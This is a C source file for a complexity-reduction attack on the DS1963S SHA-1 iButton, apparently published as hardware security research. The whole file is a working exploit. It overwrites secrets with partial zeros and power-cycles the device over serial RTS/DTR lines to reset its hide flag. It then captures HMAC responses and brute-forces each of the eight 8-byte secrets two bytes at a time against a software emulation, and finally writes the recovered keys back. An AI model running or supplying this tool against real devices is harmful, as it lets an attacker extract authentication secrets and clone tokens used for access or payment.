/* ds1963s-brute.c
 *
 * A complexity reduction attack to uncover the eight secrets on the DS1963S
 * iButton.
 *
 * Dedicated to Yuzuyu Arielle Huizer.
 *
 * -- Ronald Huizer, 2013-2016
 */
#define _GNU_SOURCE
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include "ds1963s-client.h"
#include "ds1963s-device.h"
#include "ibutton/ownet.h"
#include "ibutton/shaib.h"

#define SERIAL_PORT		"/dev/ttyUSB0"
#define UI_BANNER_HEAD		"DS1963S complexity reduction attack"
#define UI_BANNER_TAIL		"Ronald Huizer (C) 2013-2016"

extern int fd[MAX_PORTNUM];

struct brutus_secret
{
	int		state;
	uint8_t		target_hmac[4][20];
	uint8_t		secret[8];
};

struct brutus
{
	int			log_fd;
	struct ds1963s_client	ctx;
	struct ds1963s_device	dev[8];
	struct brutus_secret	secrets[8];
};

int brutus_init_device(struct brutus *brute)
{
	struct ds1963s_client *ctx = &brute->ctx;
	struct ds1963s_rom rom;
	uint32_t counters[16];
	uint8_t buf[256];
	int i;

	/* Get the DS1963S serial number. */
	if (ds1963s_client_rom_get(ctx, &rom) == -1)
		return -1;

	/* We only support the DS1963S. */
	if (rom.family != 0x18)
		return -1;

	/* Get the write cycle counters. */
	if (ds1963s_write_cycle_get_all(ctx, counters) == -1)
		return -1;

	/* Get all non-write cycle counted data pages. */
	for (i = 0; i < 8; i++) {
		int r;

		r = ds1963s_client_memory_read(ctx, 32 * i, &buf[32 * i], 32);
		if (r == -1)
			return -1;
	}

	/* Initialize the software DS1963S implementation. */
	memset(&brute->dev[0], 0, sizeof brute->dev[0]);
	brute->dev[0].family = rom.family;
	memcpy(brute->dev[0].serial, rom.serial, 6);
	memset(brute->dev[0].scratchpad, 0xFF,
	       sizeof brute->dev[0].scratchpad);
	memcpy(brute->dev[0].data_memory, buf, sizeof buf);

	/* Initialize the write cycle counters. */
	for (i = 0; i < 8; i++) {
		brute->dev[0].data_wc[i]   = counters[i];
		brute->dev[0].secret_wc[i] = counters[i + 8];
	}

	return 0;
}

int brutus_init_devices(struct brutus *brute)
{
	int i;

	if (brutus_init_device(brute) == -1)
		return -1;

	/* A shallow copy suffices for ds1963s_device structures. */
	for (i = 1; i < 8; i++)
		memcpy(&brute->dev[i], &brute->dev[0], sizeof brute->dev[0]);

	return 0;
}

void brutus_transaction_log_init(struct brutus *brute)
{
	char filename[128];
	int fd;

	snprintf(filename,
	         sizeof filename,
	         ".brutus-%.2x%.2x%.2x%.2x%.2x%.2x",
	         brute->dev[0].serial[5], brute->dev[0].serial[4],
	         brute->dev[0].serial[3], brute->dev[0].serial[2],
	         brute->dev[0].serial[1], brute->dev[0].serial[0]
	);

	if ( (fd = open(filename, O_RDWR | O_CREAT | O_EXCL, 0600)) == -1) {
		if (errno == EEXIST) {
//			brutus_transaction_log_open(filename);
//			return;
		}

		fprintf(stderr, "Error opening transaction log '%s'.\n", filename);
		exit(EXIT_FAILURE);
	}

	brute->log_fd = fd;
}

void brutus_transaction_log_append(struct brutus *brute, const uint8_t *hmac, int link)
{
	char hmac_buf[42];
	int i;

	for (i = 0; i < 20; i++)
		sprintf(&hmac_buf[i * 2], "%.2x", hmac[i]);

	strcat(hmac_buf, link == 3 ? "\n" : ",");

	write(brute->log_fd, hmac_buf, sizeof hmac_buf);
	fsync(brute->log_fd);
}

int brutus_init(struct brutus *brute)
{
	/* Initialize the secrets we'll side-channel. */
	memset(brute->secrets, 0, sizeof brute->secrets);

	/* Initialize the DS1963S client. */
	if (ds1963s_client_init(&brute->ctx, SERIAL_PORT) == -1)
		return -1;

	/* Initialize the software implementation of the DS1963S. */
	if (brutus_init_devices(brute) == -1) {
		ds1963s_client_destroy(&brute->ctx);
		return -1;
	}

	/* Initialize the transaction log. */
	brutus_transaction_log_init(brute);

	return 0;
}

void brutus_perror(const char *s)
{
	if (s)
		fprintf(stderr, "%s: ", s);

	fprintf(stderr, "%s\n", owGetErrorMsg(owGetErrorNum()));
}

void brutus_destroy(struct brutus *brute)
{
	ds1963s_client_destroy(&brute->ctx);
}

/* Pulling down the RTS and DTR lines on the serial port for a certain
 * amount of time power-on-resets the iButton.
 */
void ibutton_hide_set(SHACopr *copr)
{
	int status = 0;

	if (ioctl(fd[copr->portnum], TIOCMSET, &status) == -1) {
		perror("ioctl():");
		exit(EXIT_FAILURE);
	}

	sleep(1);

	/* Release and reacquire the port. */
	owRelease(copr->portnum);

        if ( (copr->portnum = owAcquireEx(SERIAL_PORT)) == -1) {
		fprintf(stderr, "Failed to acquire port.\n");
		exit(EXIT_FAILURE);
	}

	/* Find the DS1963S iButton again, as we've lost it after a
	 * return to probe condition.
	 */
	if (FindNewSHA(copr->portnum, copr->devAN, TRUE) == FALSE) {
		fprintf(stderr, "No DS1963S iButton found.\n");
		exit(EXIT_FAILURE);
	}
}

void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, void *data, size_t len)
{
	SHACopr *copr = &ctx->copr;
	uint8_t buf[32];
	int secret_addr;
	int address;
	uint8_t es;

        if (secret < 0 || secret > 7) {
                fprintf(stderr, "Invalid secret page.\n");
                exit(EXIT_FAILURE);
        }

        secret_addr = 0x200 + secret * 8;

	if (len > 8) {
		fprintf(stderr, "Secret length should <= 8 bytes.\n");
		exit(EXIT_FAILURE);
	}

	if (EraseScratchpadSHA18(copr->portnum, 0, 0) == FALSE) {
		fprintf(stderr, "Error erasing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ds1963s_scratchpad_write(ctx, 0, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ds1963s_scratchpad_write(ctx, secret_addr, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (1).\n");
		exit(EXIT_FAILURE);
	}

	ibutton_hide_set(copr);

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (2).\n");
		owPrintErrorMsg(stdout);
		exit(EXIT_FAILURE);
	}

	if (CopyScratchpadSHA18(copr->portnum, secret_addr, len, 0) == FALSE) {
		fprintf(stderr, "Error copying scratchpad.\n");
		exit(EXIT_FAILURE);
	}
}

#if 0
static void __hmac_hex(char *buf, uint8_t hmac[20])
{
	int i;

	for (i = 0; i < 20; i++)
		sprintf(&buf[i * 2], "%.2x", hmac[i]);
}
#endif

//	for (i = sizeof(brute->dev[0].serial) - 1; i >= 0; i--)
//		wprintw(w, "%.2x", brute->dev[0].serial[i]);

int brutus_secret_hmac_target_get(struct brutus *brute, int secret, int link)
{
	struct ds1963s_read_auth_page_reply reply;
	int portnum;
	int addr;

	assert(brute != NULL);
	assert(secret >= 0 && secret <= 8);
	assert(link >= 0 && link <= 3);

	/* Only link 0 is not destructive.  The other 3 links need a partial
	 * overwrite to make things work.
	 */
	if (link != 0) {
		ds1963s_secret_write_partial(
			&brute->ctx,		/* DS1963S context         */
			secret,			/* Secret number           */
			"\0\0\0\0\0\0\0\0",	/* Partial secret to write */
			link * 2		/* Length of the secret    */
		);
	}

	portnum = brute->ctx.copr.portnum;

	/* Calculate the address of this secret. */
	addr = ds1963s_client_page_to_address(secret);

	/* Erase the scratchpad. */
	if (EraseScratchpadSHA18(portnum, 0, 0) == FALSE)
		return -1;

	/* Read auth. page over the current scratchpad/data/etc. */
	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1)
		return -1;

	memcpy(brute->secrets[secret].target_hmac[link], reply.signature, 20);
	brutus_transaction_log_append(brute, reply.signature, link);

	return 0;
}

void *brutus_brute_link(struct brutus *brute, int secret, int link)
{
	struct brutus_secret *secret_state = &brute->secrets[secret];
	struct ds1963s_device *dev = &brute->dev[secret];
	int i;

	assert(brute != NULL);
	assert(secret >= 0 && secret <= 8);
	assert(link >= 0 && link <= 3);

	/* Set the secret to 0. */
	memset(&dev->secret_memory[secret * 8], 0, 8);

	/* Copy the known part of the secret out for this link type. */
	memcpy(&dev->secret_memory[secret * 8 + link * 2],
	       &secret_state->secret[link * 2],
	       8 - link * 2);

	for (i = 0; i < 65536; i++) {
		int index = secret * 8 + link * 2;

		dev->secret_memory[index]     = (i >> 0) & 0xFF;
		dev->secret_memory[index + 1] = (i >> 8) & 0xFF;

		ds1963s_dev_read_auth_page(dev, secret);

		if (!memcmp(secret_state->target_hmac[link], &dev->scratchpad[8], 20)) {
			secret_state->secret[link * 2] = (i >>  0) & 0xFF;
			secret_state->secret[link * 2 + 1] = (i >>  8) & 0xFF;
			break;
		}

		memset(dev->scratchpad, 0xFF, 32);
	}

	return NULL;
}

int main(int argc, char **argv)
{
	struct brutus brute;
	int i, secret, link;

	printf(UI_BANNER_HEAD " -- " UI_BANNER_TAIL "\n\n");

	if (brutus_init(&brute) == -1) {
		brutus_perror("brutus_init()");
		exit(EXIT_FAILURE);
	}

	printf("01. Calculating HMAC links.\n");

	for (secret = 0; secret < 8; secret++) {
		for (link = 0; link < 4; link++) {
			printf("\r    Secret #%d [%d/4]", secret, link);
			fflush(stdout);
			brutus_secret_hmac_target_get(&brute, secret, link);
		}
		printf("\r    Secret #%d [4/4]\n", secret);
	}

	printf("02. Calculating secrets from HMAC links.\n");

	for (secret = 0; secret < 8; secret++) {
		for (link = 3; link >= 0; link--)
			brutus_brute_link(&brute, secret, link);

		printf("    Secret #%d: ", secret);
		for (i = 0; i < 8; i++)
			printf("%.2x", brute.secrets[secret].secret[i]);
		printf("\n");
	}

	printf("03. Restoring recovered keys.\n");

	for (secret = 0; secret < 8; secret++) {
		printf("    Secret #%d\n", secret);
        	ds1963s_client_secret_write(
			&brute.ctx,
			secret,
			brute.secrets[secret].secret,
			8
		);
        }


	brutus_destroy(&brute);
	exit(EXIT_SUCCESS);
}
